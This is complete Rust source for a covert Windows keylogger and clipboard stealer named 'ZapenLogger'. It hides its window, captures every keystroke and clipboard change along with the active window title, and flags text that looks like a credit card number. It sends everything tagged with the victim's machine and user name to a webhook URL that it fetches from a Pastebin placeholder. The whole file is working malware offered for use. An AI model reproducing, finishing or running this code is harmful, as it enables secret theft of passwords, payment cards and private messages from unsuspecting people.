#![windows_subsystem = "windows"]
use clipboard_win::{formats, get_clipboard};
use regex::Regex;
use std::collections::HashSet;
use std::error::Error;
use std::ffi::OsString;
use std::fs::OpenOptions;
use std::io::{BufWriter, Write};
use std::os::windows::ffi::OsStringExt;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};
use winapi::um::winnt::WCHAR;
use winapi::um::winuser::{
    ActivateKeyboardLayout, DispatchMessageW, GetForegroundWindow, GetKeyState, GetKeyboardLayout,
    GetKeyboardState, GetWindowTextW, GetWindowThreadProcessId, MapVirtualKeyW, PeekMessageW,
    ToUnicodeEx, TranslateMessage, PM_REMOVE, VK_CAPITAL, VK_SHIFT,
};

const PASTEBIN_URL: &str = "YOUR RAW PASTEBIN URL CONTAINING WEBHOOK";

fn main() {
    let webhook = Arc::new(getwebhook().unwrap());

    let mut pressed_keys: HashSet<i32> = HashSet::new(); // Track pressed keys

    let buffer = Arc::new(Mutex::new(Vec::new()));

    let mut timer = Instant::now();

    // Create a new clipboard context.
    let mut prev_contents = match get_clipboard(formats::Unicode) {
        Ok(r) => r,
        Err(_) => String::new(),
    };

    thread::spawn({
        let webhook = Arc::clone(&webhook);
        move || loop {
            // Get the current clipboard contents.
            let current_contents: String = match get_clipboard(formats::Unicode) {
                Ok(contents) => contents,
                Err(_) => {
                    continue;
                }
            };

            // Compare the current contents with the previous contents.
            if current_contents != prev_contents {
                // Update the previous contents.
                prev_contents = current_contents.clone();

                let cc = Regex::new(r"\d{16}").unwrap().is_match(&current_contents)
                    || Regex::new(r"\b\d{2}/\d{2}\b")
                        .unwrap()
                        .is_match(&current_contents)
                    || Regex::new(r"\d{3}").unwrap().is_match(&current_contents);

                let params = &Params {
                    msgtype: MessageTypes::Clipboard,
                    content: current_contents,
                    window: get_current_window_name(),
                    special: cc,
                };

                let _ = sendhook(params, &webhook);
            }

            // Sleep for the polling interval.
            thread::sleep(Duration::from_millis(100));
        }
    });

    thread::spawn({
        let webhook = Arc::clone(&webhook);
        move || loop {
            let mut buffer = buffer.lock().unwrap();

            process_keystrokes(&mut pressed_keys, &mut buffer, &mut timer, &webhook);
            thread::sleep(Duration::from_millis(5))
        }
    })
    .join()
    .unwrap();
}

fn process_keystrokes(
    pressed_keys: &mut HashSet<i32>,
    buffer: &mut Vec<char>,
    timer: &mut Instant,
    webhook: &str,
) {
    let mut msg: winapi::um::winuser::MSG = unsafe { std::mem::zeroed() };
    unsafe {
        while PeekMessageW(&mut msg, std::ptr::null_mut(), 0, 0, PM_REMOVE) != 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    for key_code in 0x08..=0xFE {
        let state = unsafe { winapi::um::winuser::GetAsyncKeyState(key_code) };
        if state & 0x8000u16 as i16 != 0 {
            // Check if key is already pressed
            if !pressed_keys.contains(&key_code) {
                // Add key to pressed keys set
                pressed_keys.insert(key_code);
                if let Some(character) = get_character_from_vk(key_code) {
                    bufferagent(character, buffer, timer, webhook);
                }
            }
        } else {
            // Remove key from pressed keys set if it's released
            pressed_keys.remove(&key_code);
        }
    }
}

fn bufferagent(element: char, buffer: &mut Vec<char>, timer: &mut Instant, webhook: &str) {
    let file = OpenOptions::new()
        .append(true)
        .create(true)
        .open("output.txt")
        .expect("Failed to open file");

    let mut writer = BufWriter::new(file);

    let stringbuffer = buffer.iter().collect::<String>();

    if element == '\x08' {
        buffer.pop();
        return;
    }

    // Check if Enter key is pressed
    if element == '\r' && !buffer.is_empty() || element == '\n' && !buffer.is_empty() {
        // Flush the buffer to the file
        let output = format!("{} [ENTER]", &stringbuffer);

        let cc = Regex::new(r"\d{16}").unwrap().is_match(&stringbuffer)
            || Regex::new(r"\b\d{2}/\d{2}\b")
                .unwrap()
                .is_match(&stringbuffer)
            || Regex::new(r"\d{3}").unwrap().is_match(&stringbuffer);

        let params = &Params {
            msgtype: MessageTypes::Keystroke,
            content: output,
            window: get_current_window_name(),
            special: cc,
        };

        if let Err(e) = sendhook(params, webhook) {
            let output = format!(
                "ERROR SENDING TO WEBHOOK > {:?}\n{} [ENTER]",
                e, &stringbuffer
            );
            writer
                .write_all(output.as_bytes())
                .expect("Failed to write to file");
            writer.flush().expect("Failed to flush buffer");
        };
        // Clear the buffer
        buffer.clear();
        return;
    }

    if buffer.len() >= 256 {
        let output = format!(
            "[BUFFER OVERFLOW]\n{}",
            buffer.iter().collect::<String>().replace('\n', "\\n")
        );

        let cc = Regex::new(r"\d{16}").unwrap().is_match(&stringbuffer)
            || Regex::new(r"\b\d{2}/\d{2}\b")
                .unwrap()
                .is_match(&stringbuffer)
            || Regex::new(r"\d{3}").unwrap().is_match(&stringbuffer);

        let params = &Params {
            msgtype: MessageTypes::Keystroke,
            content: output,
            window: get_current_window_name(),
            special: cc,
        };

        if let Err(e) = sendhook(params, webhook) {
            let output = format!(
                "ERROR SENDING TO WEBHOOK > {:?}\n[BUFFER BLOCK]\n{}\n[BUFFER BLOCK]",
                e,
                buffer.iter().collect::<String>()
            );
            writer
                .write_all(output.as_bytes())
                .expect("Failed to write to file");
            writer.flush().expect("Failed to flush buffer");
        };
        // Clear the buffer
        buffer.clear();
    }

    if !buffer.is_empty() && timer.elapsed() >= Duration::from_secs(300) {
        let output = format!(
            "[TIMEOUT]\n{}",
            buffer.iter().collect::<String>().replace('\n', "\\n")
        );

        let cc = Regex::new(r"\d{16}").unwrap().is_match(&stringbuffer)
            || Regex::new(r"\b\d{2}/\d{2}\b")
                .unwrap()
                .is_match(&stringbuffer)
            || Regex::new(r"\d{3}").unwrap().is_match(&stringbuffer);

        let params = &Params {
            msgtype: MessageTypes::Keystroke,
            content: output,
            window: get_current_window_name(),
            special: cc,
        };

        if let Err(e) = sendhook(params, webhook) {
            let output = format!(
                "ERROR SENDING TO WEBHOOK > {:?}\n[BUFFER BLOCK]\n{}\n[BUFFER BLOCK]",
                e,
                buffer.iter().collect::<String>()
            );
            writer
                .write_all(output.as_bytes())
                .expect("Failed to write to file");
            writer.flush().expect("Failed to flush buffer");
        };
        *timer = Instant::now();
        // Clear the buffer
        buffer.clear();
    }

    // Add the pressed character to the buffer
    buffer.push(element);
}

enum MessageTypes {
    Keystroke,
    Clipboard,
}

struct Params {
    msgtype: MessageTypes,
    content: String,
    window: Option<String>,
    special: bool,
}

fn sendhook(p: &Params, webhook: &str) -> Result<(), Box<dyn Error>> {
    let victimid = std::env::var("COMPUTERNAME").unwrap_or("NULL".to_string())
        + "/"
        + &std::env::var("USERNAME").unwrap_or("NULL".to_string());
    let client = reqwest::blocking::Client::new();

    let windowfield;

    let specialnotification = if p.special {
        "\"@here :credit_card: **POTENTIAL CREDIT CARD FOUND!**\""
    } else {
        "null"
    };

    if let Some(windowname) = &p.window {
        windowfield = format!(
            r#",
        {{
          "name": "WINDOW",
          "value": "```{}```"
        }}"#,
            windowname
        );
    } else {
        windowfield = String::new()
    }

    // Manually create the JSON payload as a string
    let payload = match p.msgtype {
        MessageTypes::Keystroke => {
            format!(
                r#"{{
                "content": {},
                "embeds": [
                  {{
                    "color": 3168767,
                    "fields": [
                      {{
                        "name": ":keyboard: KEYSTOKES",
                        "value": "```{}```"
                      }}{}
                    ],
                    "footer": {{
                      "text": "BY: {}"
                    }}
                  }}
                ],
                "username": "ZapenLogger",
                "avatar_url": "https://i.ibb.co/gjtSH6G/0-KWKm-Cu-GF2-Q.jpg",
                "attachments": []
              }}"#,
                specialnotification, p.content, windowfield, victimid
            )
        }
        MessageTypes::Clipboard => {
            format!(
                r#"{{
                "content": {},
                "embeds": [
                  {{
                    "color": 3168767,
                    "fields": [
                      {{
                        "name": ":clipboard: CLIPBOARD",
                        "value": "```{}```"
                      }}{}
                    ],
                    "footer": {{
                      "text": "BY: {}"
                    }}
                  }}
                ],
                "username": "ZapenLogger",
                "avatar_url": "https://i.ibb.co/gjtSH6G/0-KWKm-Cu-GF2-Q.jpg",
                "attachments": []
              }}"#,
                specialnotification, p.content, windowfield, victimid
            )
        }
    };

    let response = client
        .post(webhook)
        .header("Content-Type", "application/json")
        .body(payload)
        .send()?;

    let status = response.status();
    if !status.is_success() {
        return Err(format!("ERROR! {} > {}", status, response.text()?).into());
    }

    Ok(())
}

fn getwebhook() -> Result<String, Box<dyn Error>> {
    let client = reqwest::blocking::Client::new();
    let response = client.get(PASTEBIN_URL).send()?;

    let text = response.text()?;
    Ok(text)
}

fn get_character_from_vk(vk_code: i32) -> Option<char> {
    unsafe {
        // Get the handle to the foreground window
        let foreground_window = GetForegroundWindow();
        // Get the thread ID of the foreground window
        let thread_id = GetWindowThreadProcessId(foreground_window, std::ptr::null_mut());
        // Get the keyboard layout for the foreground window
        let layout_id = GetKeyboardLayout(thread_id);

        // Activate the keyboard layout
        ActivateKeyboardLayout(layout_id, 0);

        // Check if Shift key or Caps Lock is pressed
        let shift_pressed = (GetKeyState(VK_SHIFT) & 0x8000u16 as i16) != 0;
        let caps_lock_active = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        let scan_code = MapVirtualKeyW(vk_code as u32, 0); // Use 0 for the second parameter to map to a scan code
        let mut buffer = [0; 2]; // Buffer to hold the translated character
        let mut keyboard_state = [0; 256]; // Keyboard state buffer
        GetKeyboardState(keyboard_state.as_mut_ptr());

        let result = ToUnicodeEx(
            vk_code as u32,
            scan_code,
            keyboard_state.as_mut_ptr(),
            buffer.as_mut_ptr(),
            buffer.len() as i32,
            0,
            layout_id,
        );

        if result > 0 {
            let mut character = char::from_u32(buffer[0] as u32).unwrap_or_default();
            // Convert to uppercase if Shift key or Caps Lock is active
            if shift_pressed || caps_lock_active {
                character = character.to_uppercase().next().unwrap_or_default();
            }
            return Some(character);
        }
    }

    None
}

fn get_current_window_name() -> Option<String> {
    unsafe {
        let handle = GetForegroundWindow();

        let mut buffer: [WCHAR; 512] = [0; 512]; // Adjust buffer size as needed
        let length = GetWindowTextW(handle, buffer.as_mut_ptr(), buffer.len() as i32);

        if length > 0 {
            match OsString::from_wide(&buffer[..length as usize]).into_string() {
                Ok(r) => Some(r),
                Err(_) => None,
            }
        } else {
            None
        }
    }
}
